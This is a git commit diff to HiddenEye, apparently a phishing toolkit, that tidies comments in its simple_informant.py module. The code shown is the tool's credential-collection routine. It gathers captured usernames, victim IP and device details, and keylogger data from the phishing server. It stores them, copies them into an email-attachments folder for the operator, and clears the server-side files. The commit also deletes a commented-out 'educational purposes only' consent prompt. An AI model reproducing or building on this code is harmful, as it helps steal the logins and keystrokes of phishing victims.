444ae10e2a26416e4d28ee9c042d71c3ed56f099
sTiKyt <stikyt@protonmail.com>
2020-06-09 02:25:27 +0300

    Removed useless/outdated/leftover comments from simple_informant

--- Defs/ActionManager/simple_informant.py
+++ Defs/ActionManager/simple_informant.py
@@ -61,14 +61,7 @@ def exit_message(port = 80):  # Message when HiddenEye exit
         run_command('clear')
         return exit_message(port)
 
-def terms_of_service_message():  # menu where user select what they wanna use
-    # Terms Of Service
-   # print("\n\n\n              {1}WITH GREAT {0}POWER {2}- {1}COMES GREAT {0}RESPONSIBILITY      ".format(red, purple, blue))
-    
-    #if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(default_palette[2], default_palette[4], default_palette[0], orange)).upper() != 'Y':
-    #    run_command('clear')
-    #    print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(default_palette[0], default_palette[4]))
-    #    exit()
+def terms_of_service_message():  
     agreement = license_handler()
     if not agreement:
         print(localization.lang_terms_of_service_message["GPL_3.0"])
@@ -99,19 +92,15 @@ def credentials_collector(port):
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 log_writer(localization.lang_credentials_collector["credentials_found"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
-                #run_command("touch Server/CapturedData/usernames.txt 
                 pathlib_Path("Server/CapturedData/usernames.txt").touch(mode=0o777, exist_ok=True)
                 
-                # && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt 
                 captured_usernames = open('Server/CapturedData/usernames.txt', 'a')
                 new_usernames = open('Server/www/usernames.txt')
                 captured_usernames.write(new_usernames.read())
                 new_usernames.close()
                 captured_usernames.close()
-                # && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt 
                 copyfile('Server/CapturedData/usernames.txt', 'Defs/FeatureManager/EmailManager/attachments/usernames.txt')
 
-                # && echo -n '' > Server/www/usernames.txt")
                 new_usernames = open('Server/www/usernames.txt', 'w')
                 new_usernames.write('')
                 new_usernames.close()
@@ -120,19 +109,14 @@ def credentials_collector(port):
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 log_writer(localization.lang_credentials_collector["device_details_found"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
-                #run_command('touch Server/CapturedData/ip.txt 
                 pathlib_Path("Server/CapturedData/ip.txt").touch(mode=0o777, exist_ok=True)
-                # && cat Server/www/ip.txt >> Server/CapturedData/ip.txt 
                 captured_ips = open('Server/CapturedData/ip.txt', 'a')
                 new_ips = open('Server/www/ip.txt')
                 captured_ips.write(new_ips.read())
                 new_ips.close()
                 captured_ips.close()
-                # && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt 
                 copyfile('Server/CapturedData/ip.txt', 'Defs/FeatureManager/EmailManager/attachments/ip.txt')
-                # && rm -rf Server/www/ip.txt 
                 new_ips = open('Server/www/ip.txt', 'w')
-                # && touch Server/www/ip.txt')
                 new_ips.write('')
                 new_ips.close()
 
@@ -144,19 +128,14 @@ def credentials_collector(port):
             if len(lines) != 0:
                 log_writer(global_localization.line_of_dots)
                 log_writer(localization.lang_credentials_collector["getting_pressed_keys"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
-                #run_command('touch Server/CapturedData/KeyloggerData.txt 
                 pathlib_Path('Server/CapturedData/KeyloggerData.txt').touch(mode=0o777, exist_ok=True)
-                # && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt
                 captured_keys = open('Server/CapturedData/KeyloggerData.txt', 'a')
                 new_keys = open('Server/www/KeyloggerData.txt')
                 captured_keys.write(new_keys.read())
                 new_keys.close()
                 captured_keys.close()
-                # && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt 
                 copyfile('Server/CapturedData/KeyloggerData.txt', 'Defs/FeatureManager/EmailManager/attachments/KeyloggerData.txt')
-                # && rm -rf Server/www/KeyloggerData.txt 
                 new_keys = open('Server/www/KeyloggerData.txt', 'w')
-                # && touch Server/www/KeyloggerData.txt')
                 new_keys.write('')
                 new_keys.close()
 
@@ -169,15 +148,8 @@ def log_writer(ctx):  # Writing log
     logFile.write(ctx.replace(default_palette[0], "").replace(default_palette[1], "").replace(default_palette[2], "").replace(default_palette[3], "").replace(default_palette[4], "") + "\n")
     print(ctx)
 
-def port_selector():  # Question where user must select port
+def port_selector():  # Requests port input from user
     run_command('clear')
-    #print('''
-    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-    #    {0}http://github.com/darksecdevelopers
-    #    {0}** BY:DARKSEC ** \n\n-------------------------------
-    # )
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
@@ -188,7 +160,7 @@ def port_selector():  # Question where user must select port
     choice = input(global_localization.input_line)
     try:
         if int(choice) > 65535 or int(choice) < 1:
-            return selectPort()
+            return port_selector()
         else:
             return choice
     except:
